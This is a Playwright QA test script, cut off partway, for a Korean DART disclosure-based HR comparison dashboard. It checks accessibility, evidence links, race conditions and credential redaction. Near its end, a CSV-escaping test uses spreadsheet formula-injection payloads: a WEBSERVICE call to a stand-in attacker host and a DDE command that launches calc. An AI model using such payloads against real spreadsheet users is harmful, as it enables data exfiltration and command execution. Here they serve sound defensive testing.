const { chromium } = require("../video_work/node_modules/playwright-core");
const fs = require("fs");
const path = require("path");

const appUrl = process.env.DART_QA_URL || "http://127.0.0.1:8765";
const edgePath = process.env.DART_QA_BROWSER
  || "C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe";
const screenshotPath = process.env.DART_QA_SCREENSHOT || "reports/overnight_sessions/dart-v2-browser.png";
const mobileScreenshotPath = process.env.DART_QA_MOBILE_SCREENSHOT
  || "reports/overnight_sessions/dart-v2-browser-mobile.png";
const mobileDecisionScreenshotPath = process.env.DART_QA_MOBILE_DECISION_SCREENSHOT
  || "reports/overnight_sessions/dart-v2-browser-mobile-decision.png";
const qaReportPath = process.env.DART_QA_REPORT || "";
const companyQueries = (process.env.DART_QA_COMPANIES
  || "삼성전자,SK하이닉스,LG전자,현대자동차")
  .split(",")
  .map((value) => value.trim())
  .filter(Boolean);

async function main() {
  const browser = await chromium.launch({ executablePath: edgePath, headless: true });
  const page = await browser.newPage({ viewport: { width: 1440, height: 1000 } });
  const errors = [];
  const failedResponses = [];
  page.on("pageerror", (error) => errors.push(error.message));
  page.on("console", (message) => {
    if (message.type() === "error") errors.push(message.text());
  });
  page.on("response", (response) => {
    if (response.status() >= 500) {
      failedResponses.push(`${response.status()} ${response.url()}`);
    }
  });

  try {
    await page.goto(appUrl, { waitUntil: "networkidle", timeout: 60_000 });
    if (!companyQueries.length) throw new Error("at least one QA company is required");
    const firstQuery = companyQueries[0];
    const searchInput = page.locator("#companySearch");
    await searchInput.fill(firstQuery);
    await page.locator("#searchResults .result-item").first().waitFor({ timeout: 60_000 });
    await searchInput.press("ArrowDown");
    const searchAccessibility = await page.evaluate(() => {
      const input = document.querySelector("#companySearch");
      const listbox = document.querySelector("#searchResults");
      const activeId = input?.getAttribute("aria-activedescendant") || "";
      const active = activeId ? document.getElementById(activeId) : null;
      return {
        comboboxRole: input?.getAttribute("role") || "",
        listboxRole: listbox?.getAttribute("role") || "",
        expanded: input?.getAttribute("aria-expanded") || "",
        activeId,
        activeRole: active?.getAttribute("role") || "",
        activeSelected: active?.getAttribute("aria-selected") || "",
      };
    });
    if (
      searchAccessibility.comboboxRole !== "combobox"
      || searchAccessibility.listboxRole !== "listbox"
      || searchAccessibility.expanded !== "true"
      || !searchAccessibility.activeId
      || searchAccessibility.activeRole !== "option"
      || searchAccessibility.activeSelected !== "true"
    ) {
      throw new Error(`search accessibility failed: ${JSON.stringify(searchAccessibility)}`);
    }
    await searchInput.press("Enter");
    if (
      await page.locator("#selectedChips .company-row").count() !== 1
      || await searchInput.getAttribute("aria-expanded") !== "false"
    ) {
      throw new Error("keyboard company selection did not close the listbox");
    }
    for (const query of companyQueries.slice(1)) {
      await page.locator("#companySearch").fill(query);
      const result = page.locator("#searchResults .result-item").filter({ hasText: query }).first();
      await result.waitFor({ timeout: 60_000 });
      await result.click();
    }
    await searchInput.fill(firstQuery);
    await page.locator("#searchResults .result-item").first().waitFor({ timeout: 60_000 });
    await searchInput.press("Escape");
    if (
      await searchInput.getAttribute("aria-expanded") !== "false"
      || await page.locator("#searchResults").textContent() !== ""
    ) {
      throw new Error("Escape did not close the company search listbox");
    }
    await searchInput.fill("");
    await page.locator("#compareButton").click();
    await page.locator("#dashboard:not(.hidden)").waitFor({ timeout: 120_000 });
    const overviewContract = await page.evaluate(() => {
      const readout = document.querySelector(".dashboard > .readout-card");
      const tabContent = document.querySelector("#tabContent");
      return {
        changeSummary: Boolean(document.querySelector(".change-summary")),
        changeCards: document.querySelectorAll(".change-card").length,
        explicitEmpty: Boolean(document.querySelector(".change-summary-empty")),
        readoutBeforeContent: Boolean(
          readout
          && tabContent
          && (readout.compareDocumentPosition(tabContent) & Node.DOCUMENT_POSITION_FOLLOWING)
        ),
        coverageText: document.querySelector("#dataCoverage")?.textContent?.trim() || "",
        readoutText: document.querySelector("#readoutText")?.textContent?.trim() || "",
      };
    });
    if (
      !overviewContract.changeSummary
      || (!overviewContract.changeCards && !overviewContract.explicitEmpty)
      || !overviewContract.readoutBeforeContent
      || !/(근거 준비도|근거 준비 \d+\/\d+)/.test(overviewContract.coverageText)
      || !/HR 비교 근거 준비도|HR 비교 근거 준비도와 원문 연결률을 계산 중/.test(overviewContract.readoutText)
    ) {
      throw new Error(`overview decision path failed: ${JSON.stringify(overviewContract)}`);
    }
    await page.locator('[data-tab="strategy"]').click();
    await page.getByText("AI 해석은 자동 실행하지 않습니다.").waitFor({ timeout: 120_000 });
    await page.locator(".evidence-run-id").waitFor({ timeout: 120_000 });
    const decisionBriefContract = await page.evaluate(() => {
      const kicker = document.querySelector(".strategy-decision-section .strategy-section-heading .kicker");
      const restatementNotice = document.querySelector(".strategy-readiness-notice");
      const readinessMatrix = document.querySelector(".strategy-readiness-matrix");
      const decisionSupport = state.orchestration?.decision_support;
      const originalBriefs = decisionSupport?.briefs || [];
      let secondaryRepresentativeCopy = "";
      let mixedSalaryBasisLabels = [];
      let mixedSalaryKpiLabel = "";
      let metricQualityCopy = "";
      let strategyLoadErrorCopy = "";
      if (decisionSupport?.briefs?.[0]) {
        try {
          const syntheticBrief = structuredClone(originalBriefs[0]);
          syntheticBrief.metric_ids = ["unavailable_primary", syntheticBrief.selected_metric_id];
          decisionSupport.briefs = [syntheticBrief];
          const syntheticDocument = new DOMParser().parseFromString(
            renderStrategyDecisionBriefs([]),
            "text/html",
          );
          secondaryRepresentativeCopy = syntheticDocument.querySelector(
            ".strategy-representative-notice",
          )?.textContent?.trim() || "";
        } finally {
          decisionSupport.briefs = originalBriefs;
        }
      }
      if (state.people?.[0]) {
        const originalPeople = state.people;
        try {
          const disclosed = structuredClone(originalPeople[0]);
          disclosed.company = { ...disclosed.company, corp_code: "SYN-BASIS-A", corp_name: "공시기준사" };
          disclosed.people.average_salary_basis = "disclosed_average_headcount_weighted";
          const fallback = structuredClone(originalPeople[0]);
          fallback.company = { ...fallback.company, corp_code: "SYN-BASIS-B", corp_name: "대체기준사" };
          fallback.people.average_salary_basis = "annual_salary_total_per_employee_fallback";
          state.people = [disclosed, fallback];
          const syntheticPeople = new DOMParser().parseFromString(renderPeople(), "text/html");
          mixedSalaryBasisLabels = [...syntheticPeople.querySelectorAll(".people-salary-basis")]
            .map((node) => node.textContent.trim());
          mixedSalaryKpiLabel = [...syntheticPeople.querySelectorAll(".people-kpi-grid .kpi")]
            .find((node) => node.querySelector("span")?.textContent?.trim() === "1인 평균 급여")
            ?.querySelector("small")?.textContent?.trim() || "";
        } finally {
          state.people = originalPeople;
        }
      }
      if (state.orchestration?.facts?.records?.[0] && originalBriefs?.[0]) {
        const originalOrchestration = state.orchestration;
        try {
          const syntheticOrchestration = structuredClone(originalOrchestration);
          const syntheticBrief = structuredClone(originalBriefs[0]);
          syntheticBrief.metric_assessments[0].quality_complete = false;
          syntheticOrchestration.decision_support.briefs = [syntheticBrief];
          syntheticOrchestration.facts.records[0].quality.components.employees.status = "partial";
          syntheticOrchestration.facts.records[0].quality.components.executives.status = "partial";
          state.orchestration = syntheticOrchestration;
          const syntheticDocument = new DOMParser().parseFromString(
            renderStrategyDecisionBriefs([]),
            "text/html",
          );
          metricQualityCopy = syntheticDocument.querySelector(".strategy-metric-quality")
            ?.textContent?.trim() || "";
        } finally {
          state.orchestration = originalOrchestration;
        }
      }
      {
        const originalPeopleHistoryError = state.peopleHistoryError;
        const originalOrchestration = state.orchestration;
        try {
          state.peopleHistoryError = "합성 People 추이 오류";
          state.orchestration = {
            status: "error",
            error: "합성 결정 브리프 오류",
            provider: { status: "unavailable" },
            trace: [],
          };
          const syntheticDocument = new DOMParser().parseFromString(renderStrategy(), "text/html");
          strategyLoadErrorCopy = syntheticDocument.querySelector(".strategy-load-notice")
            ?.textContent?.trim() || "";
        } finally {
          state.peopleHistoryError = originalPeopleHistoryError;
          state.orchestration = originalOrchestration;
        }
      }
      return {
        cards: document.querySelectorAll(".strategy-decision-card").length,
        nextData: document.querySelectorAll(".strategy-decision-card .strategy-next-data").length,
        evidenceBadges: document.querySelectorAll(".strategy-decision-card .evidence-badge").length,
        decisionTrace: [...document.querySelectorAll(".strategy-trace-row span")].some((node) => node.textContent === "decision_support"),
        sectionLabel: kicker?.textContent?.trim() || "",
        syntheticLabel: kicker ? getComputedStyle(kicker, "::before").content : "missing",
        contextualSourceLabel: Boolean(document.querySelector(".strategy-links a strong")),
        dataGapDisclosure: Boolean(document.querySelector(".strategy-gap-list")),
        representativeMetrics: document.querySelectorAll(".strategy-representative-metric").length,
        metricAssessments: document.querySelectorAll(".strategy-representative-metric li").length,
        decisionActions: document.querySelectorAll(".strategy-decision-action").length,
        cohortLimits: [...document.querySelectorAll(".strategy-cohort-limit")]
          .filter((node) => node.textContent.includes("산업·규모·사업모델")).length,
        historyIsReferenceOnly: [...document.querySelectorAll(".strategy-decision-columns small:not(.strategy-cohort-limit)")]
          .every((node) => node.textContent.includes("readiness 산정 제외")),
        readinessDimensions: document.querySelectorAll(".strategy-readiness-matrix > div").length,
        restatementNotice: restatementNotice?.textContent?.trim() || "",
        restatementNoticeBeforeMatrix: Boolean(
          restatementNotice
          && readinessMatrix
          && (restatementNotice.compareDocumentPosition(readinessMatrix) & Node.DOCUMENT_POSITION_FOLLOWING)
        ),
        policyScopeCopy: document.querySelector(".strategy-evidence-card:nth-child(3) p")?.textContent?.trim() || "",
        policyStatusCopy: document.querySelector(".strategy-evidence-card:nth-child(3) > strong")?.textContent?.trim() || "",
        globalFreshnessWarning: document.querySelector("#readoutText")?.textContent?.includes("정정공시 최신성은 아직 검증하지 않았습니다") || false,
        secondaryRepresentativeCopy,
        governanceBoundaryCopy: document.querySelector(".strategy-readiness-boundary")?.textContent?.trim() || "",
        mixedSalaryBasisLabels,
        mixedSalaryKpiLabel,
        metricQualityCopy,
        liveMetricQualityCopies: [...document.querySelectorAll(".strategy-metric-quality")]
          .map((node) => node.textContent.trim()),
        readyLowDimensions: [...document.querySelectorAll(".strategy-readiness-matrix > div.ready")]
          .filter((node) => node.textContent.includes("근거 신뢰 낮음")).length,
        strategyLoadErrorCopy,
      };
    });
    if (
      decisionBriefContract.cards !== 3
      || decisionBriefContract.nextData !== 3
      || decisionBriefContract.evidenceBadges < 3
      || !decisionBriefContract.decisionTrace
      || decisionBriefContract.sectionLabel !== "DECISION BRIEF"
      || !["none", "normal"].includes(decisionBriefContract.syntheticLabel)
      || !decisionBriefContract.contextualSourceLabel
      || !decisionBriefContract.dataGapDisclosure
      || decisionBriefContract.representativeMetrics !== 3
      || decisionBriefContract.metricAssessments < 6
      || decisionBriefContract.decisionActions !== 3
      || decisionBriefContract.cohortLimits !== 3
      || !decisionBriefContract.historyIsReferenceOnly
      || decisionBriefContract.readinessDimensions !== 5
      || !decisionBriefContract.restatementNotice.includes("정정공시 최신성 미검증")
      || !decisionBriefContract.restatementNotice.includes("확정 판단에 사용하지 마세요")
      || !decisionBriefContract.restatementNoticeBeforeMatrix
      || !decisionBriefContract.policyScopeCopy.includes("선택 기업")
      || decisionBriefContract.policyStatusCopy !== "허용"
      || !decisionBriefContract.globalFreshnessWarning
      || !decisionBriefContract.secondaryRepresentativeCopy.includes("보조 지표")
      || !decisionBriefContract.secondaryRepresentativeCopy.includes("내부 원장")
      || !decisionBriefContract.governanceBoundaryCopy.includes("승계 권고 아님")
      || !decisionBriefContract.governanceBoundaryCopy.includes("핵심보직 승계 후보군")
      || !decisionBriefContract.governanceBoundaryCopy.includes("직접 알 수 없음")
      || !decisionBriefContract.governanceBoundaryCopy.includes("승계 준비도")
      || !decisionBriefContract.mixedSalaryBasisLabels.includes("공시 평균·인원 가중")
      || !decisionBriefContract.mixedSalaryBasisLabels.includes("급여총액÷직원 수 대체")
      || !decisionBriefContract.mixedSalaryKpiLabel.includes("직원수 가중")
      || !decisionBriefContract.mixedSalaryKpiLabel.includes("계산 기준 혼합")
      || !decisionBriefContract.metricQualityCopy.includes("품질 주의")
      || !decisionBriefContract.metricQualityCopy.includes("직원 현황")
      || decisionBriefContract.metricQualityCopy.includes("임원 현황")
      || decisionBriefContract.readyLowDimensions < 1
      || !decisionBriefContract.liveMetricQualityCopies.some((value) => value.includes("직원 현황"))
      || decisionBriefContract.liveMetricQualityCopies.some((value) => value.includes("LG전자"))
      || !decisionBriefContract.strategyLoadErrorCopy.includes("People 추이 실패")
      || !decisionBriefContract.strategyLoadErrorCopy.includes("결정 브리프 실패")
      || !decisionBriefContract.strategyLoadErrorCopy.includes("확정 판단에 사용하지 말고")
    ) {
      throw new Error(`decision brief contract failed: ${JSON.stringify(decisionBriefContract)}`);
    }

    const strategyTab = page.locator('[data-tab="strategy"]');
    const tabState = await page.locator('#tabs [role="tab"]').evaluateAll((tabs) => ({
      selected: tabs.filter((tab) => tab.getAttribute("aria-selected") === "true").map((tab) => tab.dataset.tab),
      tabbable: tabs.filter((tab) => tab.tabIndex === 0).map((tab) => tab.dataset.tab),
      activeId: tabs.find((tab) => tab.getAttribute("aria-selected") === "true")?.id || "",
      labelledBy: document.querySelector("#tabContent")?.getAttribute("aria-labelledby") || "",
      promptLabelled: document.querySelector("#analysisPrompt")?.labels?.length === 1,
    }));
    if (
      JSON.stringify(tabState.selected) !== '["strategy"]'
      || JSON.stringify(tabState.tabbable) !== '["strategy"]'
      || !tabState.activeId
      || tabState.labelledBy !== tabState.activeId
      || !tabState.promptLabelled
    ) {
      throw new Error(`invalid tab state: ${JSON.stringify(tabState)}`);
    }
    await strategyTab.focus();
    await strategyTab.press("ArrowRight");
    const keyboardTab = await page.locator('#tabs [aria-selected="true"]').getAttribute("data-tab");
    if (keyboardTab !== "radar" || await page.locator('[data-tab="radar"]').getAttribute("tabindex") !== "0") {
      throw new Error(`keyboard tab navigation failed: ${keyboardTab}`);
    }
    await page.locator('[data-tab="rank"]').click();
    const comparisonBoundary = (await page.locator(".comparison-boundary").textContent() || "").trim();
    if (!comparisonBoundary.includes("인과·개인평가·자동 인사조치의 근거가 아닙니다")) {
      throw new Error(`relative comparison boundary failed: ${comparisonBoundary}`);
    }
    await strategyTab.click();

    const runId = (await page.locator(".evidence-run-id").textContent() || "").trim();
    const evidenceLinks = await page.locator(".strategy-links a").evaluateAll((links) => (
      links.map((link) => link.href)
    ));
    const unsafeLink = evidenceLinks.find((url) => {
      try {
        const parsed = new URL(url);
        return parsed.protocol !== "https:"
          || !["dart.fss.or.kr", "opendart.fss.or.kr"].includes(parsed.hostname);
      } catch {
        return true;
      }
    });
    if (!/^RUN-[0-9a-f]{12}$/.test(runId)) {
      throw new Error(`invalid run id: ${runId}`);
    }
    if (!evidenceLinks.length || unsafeLink) {
      throw new Error(`invalid evidence links: ${JSON.stringify(evidenceLinks)}`);
    }
    const citationRendering = await page.evaluate(() => {
      const evidenceId = "EV-abc123abc123";
      const linked = renderEvidenceText(`직원 수 100명 [${evidenceId}]`, [{
        evidence_id: evidenceId,
        metric_id: "employees_total",
        source_urls: [
          "https://dart.fss.or.kr/dsaf001/main.do?rcpNo=20250000000001",
        ],
      }]);
      const unknown = renderEvidenceText(`알 수 없는 [EV-deadbeefdead]`, []);
      const unsafe = renderEvidenceText(`[${evidenceId}]`, [{
        evidence_id: evidenceId,
        source_urls: ["https://user:secret@dart.fss.or.kr/fake"],
      }]);
      const credentialUrl = renderEvidenceText(`[${evidenceId}]`, [{
        evidence_id: evidenceId,
        source_urls: [
          "https://opendart.fss.or.kr/api/list.json?crtfc_key=secret",
        ],
      }]);
      return {
        linked,
        unknown,
        unsafe,
        credentialUrl,
      };
    });
    if (
      !citationRendering.linked.includes("class=\"evidence-citation\"")
      || !citationRendering.linked.includes("https://dart.fss.or.kr/")
      || citationRendering.unknown.includes("<a")
      || citationRendering.unknown.includes("[[")
      || citationRendering.unsafe.includes("<a")
      || citationRendering.credentialUrl.includes("<a")
    ) {
      throw new Error(`citation rendering failed: ${JSON.stringify(citationRendering)}`);
    }
    const numericBoundary = await page.evaluate(() => ({
      infinity: numberValue("Infinity"),
      nan: numberValue("NaN"),
      boolean: numberValue(false),
      whitespace: numberValue("   "),
      finite: numberValue("123.5"),
    }));
    if (
      numericBoundary.infinity !== null
      || numericBoundary.nan !== null
      || numericBoundary.boolean !== null
      || numericBoundary.whitespace !== null
      || numericBoundary.finite !== 123.5
    ) {
      throw new Error(`numeric boundary failed: ${JSON.stringify(numericBoundary)}`);
    }
    const signedVisualizationBoundary = await page.evaluate(() => {
      const negativeValues = [-20, -10, -5];
      const negativePositions = negativeValues.map((value) => (
        scatterAxisPosition(value, negativeValues)
      ));
      const mixedValues = [-20, 0, 20];
      const mixedPositions = mixedValues.map((value) => scatterAxisPosition(value, mixedValues));
      const signedProfitDocument = new DOMParser().parseFromString(renderStrategyProfitChart([
        {
          item: { company: { corp_code: "a", corp_name: "적자기업" } },
          series: [
            { year: 2023, value: -20 },
            { year: 2024, value: 0 },
            { year: 2025, value: 10 },
          ],
        },
      ]), "text/html");
      const profitBars = [...signedProfitDocument.querySelectorAll(".strategy-profit-column i")];
      const signedProfitHost = document.createElement("div");
      signedProfitHost.className = "strategy-brief";
      signedProfitHost.innerHTML = signedProfitDocument.body.innerHTML;
      document.body.appendChild(signedProfitHost);
      const renderedProfitBars = [...signedProfitHost.querySelectorAll(".strategy-profit-column i")];
      const zeroProfitHeight = renderedProfitBars[1]?.getBoundingClientRect().height ?? -1;
      signedProfitHost.remove();
      return {
        negativePositions,
        mixedPositions,
        signedProfitChart: Boolean(signedProfitDocument.querySelector(".strategy-profit-chart.signed-axis")),
        negativeProfitBelowZero: profitBars[0]?.getAttribute("style")?.includes("top:50%") || false,
        zeroProfitHeight,
        positiveProfitAboveZero: profitBars[2]?.getAttribute("style")?.includes("bottom:50%") || false,
        signedProfitHasNegativeAxis: signedProfitDocument.querySelector(".strategy-profit-axis")?.textContent?.includes("-") || false,
        zeroWeightAverage: strategyWeightedAverage([
          { total: 0, average_salary: null },
          { total: 10, average_salary: 7000 },
        ], "average_salary"),
        missingPositiveAverage: strategyWeightedAverage([
          { total: 0, average_salary: 5000 },
          { total: 10, average_salary: null },
        ], "average_salary"),
        zeroOnlyAverage: strategyWeightedAverage([
          { total: 0, average_salary: 5000 },
        ], "average_salary"),
      };
    });
    if (
      !(signedVisualizationBoundary.negativePositions[0]
        < signedVisualizationBoundary.negativePositions[1]
        && signedVisualizationBoundary.negativePositions[1]
        < signedVisualizationBoundary.negativePositions[2])
      || JSON.stringify(signedVisualizationBoundary.mixedPositions) !== "[5,50,95]"
      || !signedVisualizationBoundary.signedProfitChart
      || !signedVisualizationBoundary.negativeProfitBelowZero
      || signedVisualizationBoundary.zeroProfitHeight !== 0
      || !signedVisualizationBoundary.positiveProfitAboveZero
      || !signedVisualizationBoundary.signedProfitHasNegativeAxis
      || signedVisualizationBoundary.zeroWeightAverage !== 7000
      || signedVisualizationBoundary.missingPositiveAverage !== null
      || signedVisualizationBoundary.zeroOnlyAverage !== null
    ) {
      throw new Error(`signed visualization boundary failed: ${JSON.stringify(signedVisualizationBoundary)}`);
    }
    const missingValueBoundary = await page.evaluate(() => {
      const snapshot = {
        results: state.results,
        people: state.people,
        executives: state.executives,
        executivesError: state.executivesError,
        aiMessages: state.aiMessages,
        selected: state.selected,
        orchestration: state.orchestration,
      };
      try {
        state.results = [{ company: { corp_code: "missing", corp_name: "결측" }, financials: {} }];
        const noFinancialRows = availableResults().length;
        state.results = [{ company: { corp_code: "partial", corp_name: "부분" }, financials: { revenue: 1 } }];
        const radarDoc = new DOMParser().parseFromString(renderRadar(), "text/html");
        const radarIsEmpty = Boolean(radarDoc.querySelector(".empty-state"));
        state.selected = [{ corp_code: "partial", corp_name: "부분" }];
        state.orchestration = null;
        const strategyDoc = new DOMParser().parseFromString(renderStrategy(), "text/html");
        const strategyProfitTotal = strategyDoc.querySelector(".strategy-flow-node small")?.textContent?.trim();
        state.people = [
          { company: { corp_code: "a", corp_name: "A" }, people: { employees_total: 10, average_salary: 100 } },
          { company: { corp_code: "b", corp_name: "B" }, people: { employees_total: null, average_salary: 200 } },
        ];
        const peopleDoc = new DOMParser().parseFromString(renderPeople(), "text/html");
        const peopleTotal = peopleDoc.querySelector(".kpi strong")?.textContent?.trim();
        const peopleTotalCoverage = peopleDoc.querySelector(".kpi small")?.textContent?.trim();
        const peopleSalary = peopleDoc.querySelectorAll(".kpi strong")[3]?.textContent?.trim();
        const peopleSalaryCoverage = peopleDoc.querySelectorAll(".kpi small")[3]?.textContent?.trim();
        state.executives = [{
          company: { corp_code: "a", corp_name: "A" },
          executive_metrics: { executives_total: null, average_tenure_months: null },
          quality: { status: "partial", warnings: [] },
        }];
        state.executivesError = "";
        const executiveDoc = new DOMParser().parseFromString(renderExecutives(), "text/html");
        const executiveTotal = executiveDoc.querySelector(".kpi strong")?.textContent?.trim();
        const executiveTenure = executiveDoc.querySelectorAll(".kpi strong")[3]?.textContent?.trim();
        state.aiMessages = [{ role: "user", content: "이전 탭 질문" }];
        resetAiConversationForContextChange();
        const aiConversationReset = state.aiMessages.length === 0;
        return {
          noFinancialRows,
          radarIsEmpty,
          strategyProfitTotal,
          peopleTotal,
          peopleTotalCoverage,
          peopleSalary,
          peopleSalaryCoverage,
          executiveTotal,
          executiveTenure,
          aiConversationReset,
        };
      } finally {
        state.results = snapshot.results;
        state.people = snapshot.people;
        state.executives = snapshot.executives;
        state.executivesError = snapshot.executivesError;
        state.aiMessages = snapshot.aiMessages;
        state.selected = snapshot.selected;
        state.orchestration = snapshot.orchestration;
        renderAiConversation();
      }
    });
    if (
      missingValueBoundary.noFinancialRows !== 0
      || !missingValueBoundary.radarIsEmpty
      || !missingValueBoundary.aiConversationReset
      || missingValueBoundary.strategyProfitTotal !== "— · 공시 데이터 없음"
      || missingValueBoundary.peopleTotal !== "10명"
      || missingValueBoundary.peopleSalary !== "100원"
      || missingValueBoundary.peopleTotalCoverage !== "1/2개 기업 사용 · 합산"
      || missingValueBoundary.peopleSalaryCoverage !== "1/2개 기업 사용 · 직원수 가중 · 계산근거 확인 필요"
      || missingValueBoundary.executiveTotal !== "—"
      || missingValueBoundary.executiveTenure !== "—"
    ) {
      throw new Error(`missing values became false zeroes: ${JSON.stringify(missingValueBoundary)}`);
    }

    const atomicBaseline = await page.evaluate(() => ({
      year: state.year,
      reportCode: state.reportCode,
      results: state.results,
      people: state.people,
      history: state.history,
      serializedResults: JSON.stringify(state.results),
    }));
    const alternateYear = atomicBaseline.year === "2024" ? "2023" : "2024";
    const alternateReport = atomicBaseline.reportCode === "11012" ? "11011" : "11012";
    let releaseHistory;
    let markHistoryStarted;
    const historyStarted = new Promise((resolve) => { markHistoryStarted = resolve; });
    await page.route("**/api/financials?*", (route) => route.fulfill({
      status: 200,
      contentType: "application/json",
      body: JSON.stringify({ results: atomicBaseline.results }),
    }));
    await page.route("**/api/people?*", (route) => route.fulfill({
      status: 200,
      contentType: "application/json",
      body: JSON.stringify({ results: atomicBaseline.people }),
    }));
    await page.route("**/api/financials/history?*", async (route) => {
      markHistoryStarted();
      await new Promise((resolve) => { releaseHistory = resolve; });
      await route.fulfill({
        status: 200,
        contentType: "application/json",
        body: JSON.stringify({ results: atomicBaseline.history }),
      });
    });
    await page.locator("#yearSelect").selectOption(alternateYear);
    await page.locator("#compareButton").click();
    await historyStarted;
    await page.locator("#reportSelect").selectOption(alternateReport);
    releaseHistory();
    await page.locator("#compareButton:not(:disabled)").waitFor({ timeout: 10_000 });
    const atomicResult = await page.evaluate(() => ({
      year: state.year,
      reportCode: state.reportCode,
      serializedResults: JSON.stringify(state.results),
    }));
    if (
      atomicResult.year !== atomicBaseline.year
      || atomicResult.reportCode !== atomicBaseline.reportCode
      || atomicResult.serializedResults !== atomicBaseline.serializedResults
    ) {
      throw new Error(`stale comparison mutated committed state: ${JSON.stringify(atomicResult)}`);
    }
    await page.unroute("**/api/financials/history?*");
    await page.unroute("**/api/people?*");
    await page.unroute("**/api/financials?*");
    await page.locator("#yearSelect").selectOption(atomicBaseline.year);
    await page.locator("#reportSelect").selectOption(atomicBaseline.reportCode);
    await page.evaluate(() => setMessage(""));

    let releaseAnalysis;
    let markAnalysisStarted;
    let analysisHasEnteredKey = false;
    const analysisStarted = new Promise((resolve) => { markAnalysisStarted = resolve; });
    await page.route("**/api/analysis", async (route) => {
      analysisHasEnteredKey = route.request().headers()["x-openai-api-key"] === "sk-browser-race-contract";
      markAnalysisStarted();
      await new Promise((resolve) => { releaseAnalysis = resolve; });
      await route.abort("failed").catch(() => {});
    });
    await page.locator("#openAiApiKey").fill("sk-browser-race-contract");
    await page.locator("#analysisPrompt").fill("오래된 응답이 남지 않는지 확인");
    await page.locator("#runAiButton").click();
    await analysisStarted;
    if (!analysisHasEnteredKey) {
      throw new Error("first AI request did not carry the entered API key");
    }
    await page.locator("#aiResult .pending").waitFor({ timeout: 10_000 });
    await page.locator("#clearAiButton").click();
    releaseAnalysis();
    await page.waitForTimeout(500);
    const staleAiState = {
      messages: await page.locator("#aiResult .ai-chat-message").count(),
      disabled: await page.locator("#runAiButton").isDisabled(),
      label: (await page.locator("#runAiButton").textContent() || "").trim(),
      connection: await page.locator("#apiConnectState").getAttribute("data-state"),
    };
    if (
      staleAiState.messages !== 0
      || staleAiState.disabled
      || staleAiState.label !== "AI에게 질문하기 ↗"
      || staleAiState.connection !== "idle"
    ) {
      throw new Error(`stale AI request was not discarded: ${JSON.stringify(staleAiState)}`);
    }
    await page.unroute("**/api/analysis");

    let releasePeriodAnalysis;
    let markPeriodAnalysisStarted;
    const periodAnalysisStarted = new Promise((resolve) => { markPeriodAnalysisStarted = resolve; });
    await page.route("**/api/analysis", async (route) => {
      markPeriodAnalysisStarted();
      await new Promise((resolve) => { releasePeriodAnalysis = resolve; });
      await route.fulfill({
        status: 200,
        contentType: "application/json",
        body: JSON.stringify({
          provider: { status: "completed", result: "discard me" },
          evidence: { ledger: [] },
        }),
      }).catch(() => {});
    });
    await page.locator("#analysisPrompt").fill("기간 변경 취소 검증");
    await page.locator("#runAiButton").click();
    await periodAnalysisStarted;
    await page.locator("#aiResult .pending").waitFor({ timeout: 10_000 });
    await page.locator("#yearSelect").selectOption(alternateYear);
    releasePeriodAnalysis();
    await page.waitForTimeout(500);
    const periodAiState = {
      messages: await page.locator("#aiResult .ai-chat-message").count(),
      pending: await page.locator("#aiResult .pending").count(),
      disabled: await page.locator("#runAiButton").isDisabled(),
    };
    if (periodAiState.messages !== 0 || periodAiState.pending !== 0 || periodAiState.disabled) {
      throw new Error(`period change did not cancel AI request: ${JSON.stringify(periodAiState)}`);
    }
    await page.unroute("**/api/analysis");
    await page.locator("#yearSelect").selectOption(atomicBaseline.year);

    const conversationBudget = await page.evaluate(() => {
      const previousMessages = state.aiMessages;
      const latestQuestion = "LATEST-QUESTION-MUST-BE-PRESERVED";
      state.aiMessages = Array.from({ length: 6 }, (_, index) => ({
        role: index % 2 ? "assistant" : "user",
        content: `${index}:` + "과거 대화".repeat(1200)
          + (index === 5 ? " sk-history-secret123" : ""),
      }));
      const result = conversationQuestion(latestQuestion);
      state.aiMessages = previousMessages;
      return {
        length: result.length,
        latestPreserved: result.endsWith(latestQuestion),
        historyRetained: result.includes("[이전 대화]"),
        credentialRedacted: !result.includes("history-secret123")
          && redactCredentialText(
            "sk-user-secret123 crtfc_key=dart-secret123 Bearer gateway-secret123",
          ) === "[REDACTED] crtfc_key=[REDACTED] Bearer [REDACTED]",
      };
    });
    if (
      conversationBudget.length > 4000
      || !conversationBudget.latestPreserved
      || !conversationBudget.historyRetained
      || !conversationBudget.credentialRedacted
    ) {
      throw new Error(`AI conversation budget failed: ${JSON.stringify(conversationBudget)}`);
    }

    const csvBoundary = await page.evaluate(() => ({
      formula: csvCell("=WEBSERVICE(\"https://attacker.invalid\")"),
      command: csvCell("-cmd|' /C calc'!A0"),
      numeric: csvCell(-10),
    }));
    if (
      !csvBoundary.formula.startsWith('"\'=')
      || !csvBoundary.command.startsWith('"\'-')
      || csvBoundary.numeric !== '"-10"'
    ) {
      throw new Error(`CSV formula boundary failed: ${JSON.stringify(csvBoundary)}`);
    }
    if (errors.length || failedResponses.length) {
      throw new Error(JSON.stringify({ errors, failedResponses }));
    }

    const contrastRatios = await page.evaluate(() => {
      const parseColor = (value) => {
        const normalized = value.trim();
        if (normalized.startsWith("#")) {
          const hex = normalized.slice(1);
          const expanded = hex.length === 3
            ? [...hex].map((character) => character + character).join("")
            : hex;
          return [0, 2, 4].map(
            (offset) => Number.parseInt(expanded.slice(offset, offset + 2), 16),
          );
        }
        const channels = normalized.match(/[\d.]+/g) || [];
        const values = channels.slice(0, 3).map(Number);
        return normalized.startsWith("color(srgb")
          ? values.map((channel) => channel * 255)
          : values;
      };
      const luminance = (value) => {
        const channels = parseColor(value).map((channel) => {
          const normalized = channel / 255;
          return normalized <= 0.04045
            ? normalized / 12.92
            : ((normalized + 0.055) / 1.055) ** 2.4;
        });
        return 0.2126 * channels[0] + 0.7152 * channels[1] + 0.0722 * channels[2];
      };
      const ratio = (foreground, background) => {
        const first = luminance(foreground);
        const second = luminance(background);
        return (Math.max(first, second) + 0.05) / (Math.min(first, second) + 0.05);
      };
      const collect = (scope, prefix = "") => {
        const token = (name) => {
          const probe = document.createElement("span");
          probe.style.color = `var(${name})`;
          probe.style.display = "none";
          scope.appendChild(probe);
          const value = getComputedStyle(probe).color;
          probe.remove();
          return value;
        };
        const card = token(prefix ? `${prefix}panel` : "--card");
        const cardSecondary = token(prefix ? `${prefix}panel-2` : "--card");
        const paper = token(prefix ? `${prefix}panel` : "--paper");
        const pairs = prefix === "--ref-"
          ? [
            ["ink/panel", token("--ref-ink"), card],
            ["ink/panel-2", token("--ref-ink"), cardSecondary],
            ["ink-dim/panel", token("--ref-ink-dim"), card],
